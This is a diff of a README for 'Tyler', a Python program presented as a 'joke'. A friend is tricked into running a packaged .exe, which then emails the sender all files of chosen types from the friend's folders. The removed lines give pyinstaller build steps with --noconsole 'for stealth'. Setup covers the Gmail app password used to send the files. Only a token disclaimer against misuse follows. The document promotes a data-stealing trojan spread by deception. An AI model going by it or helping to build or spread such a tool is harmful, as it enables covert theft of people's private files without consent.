@@ -1,21 +1,15 @@
 # Tyler
 
-📁 **Tyler** — this is a Python script for a "joke". The idea of ​​the script is that you ask your friend to open an .exe file under the pretext that you wrote a cool thing, but here's the problem, the script sends you all the files from some your friend's folders to your email (if you are interested in another folder, you can change it in the code). The project is easy to run from the command line and can be packed using `pyinstaller`.
+📁 **Tyler** — this is a Python script for a "joke". The idea of ​​the script is that you ask your friend to open an .exe file under the pretext that you wrote a cool thing, but here's the problem, the script sends you all the files from the your friend folders to your email. 
 
-## 📦 Installation
 
 It will not work on Linux or MacOS
 
-Make sure you have Python 3.7+ installed and `pip`.
+# 🚀 Setup
+To launch the main script, run the setup.py file and fill in all the required fields. This is not difficult, except for the email password field, which I will explain later.
+Also in line 'extensions' you can add extensions you want. Write extensions separated by spaces, without commas (.exe .jpg .pdf .cpp .c ...).
+The EXE file will be in the **"dist"** folder
 
-```bash
-git clone https://github.com/DENdidpip/Tyler
-
-cd Tyler
-```
-## 🚀 Setup
-
-To launch the main script, you must go to the file "tr.py" and fill in all the information there(it's at the comment "const"). There is nothing complicated there, except for the line email_password
 
 # How can you get it in Gmail
 
@@ -43,28 +37,7 @@ Direct link (if available):
 
 6. Google will generate a **16-digit code** — this is your `app_password`.
 ---
-Also in array 'allowed_extensions' you can add extensions you want(.jpeg, .jpg, .pdf, .txt, .docs...)
 
-```bash
-python tr.py
-```
 
-## 🧩 Build to .exe (for stealth when running the file, the console will not be displayed)
-
-```bash
-pip install pyinstaller
-
-pyinstaller --noconsole -F tr.py
-```
-
-or worse choice
-
-```bash
-pip install pyinstaller
-
-pyinstaller -F tr.py
-```
-
-After that, the .exe will appear in the dist/ folder, which you can send to your friend:)
 
 ## P.S.: not to be used for bad intentions!!! Also, at first, you should test it on yourself to check if it works
